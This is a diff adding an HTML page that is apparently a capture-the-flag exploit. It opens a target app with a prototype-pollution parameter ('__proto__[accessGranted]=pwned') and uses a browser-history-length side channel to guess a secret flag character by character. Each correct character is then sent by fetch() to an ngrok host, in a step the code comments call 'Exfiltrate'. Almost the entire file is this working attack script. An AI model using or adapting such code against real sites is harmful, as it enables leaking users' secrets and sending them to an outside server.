@@ -1,0 +1,44 @@
+<html>
+
+<body>
+    <script>
+        const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{_}';
+
+        const sleep = (ms) => {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        const tryCharacter = async(correctSoFar, guess) => {
+
+            let opened = window.open(`http://app:80/?search=${correctSoFar + guess}&token=&__proto__[accessGranted]=pwned`);
+
+            // Allow 30 seconds for the navigations to happen
+            await sleep(10000);
+            opened.location = "http://98ac-2402-800-63b7-e478-8d1d-9907-e0c6-5c37.ngrok.io/nothing.txt";
+
+            // Allow 30 seconds for the redirects to complete
+            await sleep(10000);
+
+            return [opened.history.length === 3, guess];
+        }
+
+        let correctSoFar = "SEE{";
+
+        for (let i = 0; i < alphabet.length; i++) {
+            guess = alphabet[i];
+
+            tryCharacter(correctSoFar, guess).then(resp => {
+                let [success, guess] = resp;
+                console.log(success, guess)
+
+                if (success) {
+
+                    // Exfiltrate
+                    fetch("http://98ac-2402-800-63b7-e478-8d1d-9907-e0c6-5c37.ngrok.io/" + guess);
+                }
+            })
+        }
+    </script>
+</body>
+
+</html>
